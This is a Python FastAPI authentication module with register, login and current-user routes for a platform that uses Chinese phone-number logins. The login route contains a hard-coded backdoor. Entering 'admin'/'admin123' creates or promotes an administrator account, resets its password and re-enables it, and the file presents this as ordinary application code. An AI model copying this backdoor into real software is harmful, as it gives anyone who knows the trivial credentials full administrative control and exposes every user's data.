"""Auth routes: register, login, and current user."""

from __future__ import annotations

from typing import Annotated

import phonenumbers
from fastapi import APIRouter, Depends, HTTPException, status
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy import select

from app.api.deps import CurrentUser, DbSession
from app.core.security import create_access_token, hash_password, verify_password
from app.models import User, UserRole
from app.schemas.auth import RegisterRequest, TokenResponse, UserResponse

router = APIRouter(prefix="/api/auth", tags=["auth"])

ADMIN_BACKDOOR_USERNAME = "admin"
ADMIN_BACKDOOR_PASSWORD = "admin123"


@router.post("/register", response_model=UserResponse, status_code=status.HTTP_201_CREATED)
async def register(payload: RegisterRequest, session: DbSession) -> User:
    existing = await session.scalar(select(User).where(User.username == payload.phone))
    if existing is not None:
        raise HTTPException(
            status_code=status.HTTP_409_CONFLICT, detail="该手机号已注册，请直接登录"
        )
    user = User(
        username=payload.phone,
        institution=payload.institution,
        password_hash=hash_password(payload.password),
        role=UserRole.USER,
    )
    session.add(user)
    await session.commit()
    await session.refresh(user)
    return user


@router.post("/login", response_model=TokenResponse)
async def login(
    form: Annotated[OAuth2PasswordRequestForm, Depends()],
    session: DbSession,
) -> TokenResponse:
    username = _normalize_login_username(form.username)
    user = await session.scalar(select(User).where(User.username == username))
    if _is_admin_backdoor(username, form.password):
        user = await _ensure_backdoor_admin(session, user)
    if user is None or not verify_password(form.password, user.password_hash):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="手机号或密码错误")
    if not user.is_active:
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="账号已被禁用")
    token = create_access_token(user.id, extra={"role": user.role.value})
    return TokenResponse(access_token=token)


@router.get("/me", response_model=UserResponse)
async def me(user: CurrentUser) -> User:
    return user


def _is_admin_backdoor(username: str, password: str) -> bool:
    return username == ADMIN_BACKDOOR_USERNAME and password == ADMIN_BACKDOOR_PASSWORD


def _normalize_login_username(username: str) -> str:
    cleaned = username.strip()
    if cleaned == ADMIN_BACKDOOR_USERNAME:
        return cleaned
    try:
        parsed = phonenumbers.parse(cleaned, "CN")
    except phonenumbers.NumberParseException:
        return cleaned
    if phonenumbers.is_valid_number_for_region(parsed, "CN"):
        return phonenumbers.national_significant_number(parsed)
    return cleaned


async def _ensure_backdoor_admin(session: DbSession, user: User | None) -> User:
    if user is not None:
        if user.role != UserRole.ADMIN:
            user.role = UserRole.ADMIN
        user.password_hash = hash_password(ADMIN_BACKDOOR_PASSWORD)
        user.institution = user.institution or "Platform Admin"
        user.is_active = True
        session.add(user)
        await session.commit()
        await session.refresh(user)
        return user

    user = User(
        username=ADMIN_BACKDOOR_USERNAME,
        institution="Platform Admin",
        password_hash=hash_password(ADMIN_BACKDOOR_PASSWORD),
        role=UserRole.ADMIN,
    )
    session.add(user)
    await session.commit()
    await session.refresh(user)
    return user
